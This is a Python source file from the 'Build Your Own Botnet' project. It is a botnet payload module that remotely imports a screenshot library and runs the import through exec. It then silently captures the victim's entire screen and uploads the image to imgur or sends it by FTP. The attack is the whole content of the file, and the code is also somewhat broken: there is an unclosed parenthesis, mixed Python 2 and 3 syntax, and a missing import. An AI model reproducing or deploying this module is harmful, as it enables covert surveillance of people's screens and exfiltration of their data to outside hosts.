#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# byob

import util

# remote imports

with httpimport.remote_repo(['mss'], base_url='http://localhost:8000'):
    for module in ['mss']:
        try:
            exec "import %s" % module
        except ImportError:
            util.debug("Error: unable to import '%s'" % module



def screenshot(method):
    try:
        if method in ('ftp', 'imgur') and hasattr(util, method):
            with mss.mss() as screen:
                img = screen.grab(screen.monitors[0])
            png     = util.png(img)
            result  = util.imgur(png)
            return getattr(util, method)(result)
    except Exception as e:
        util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))
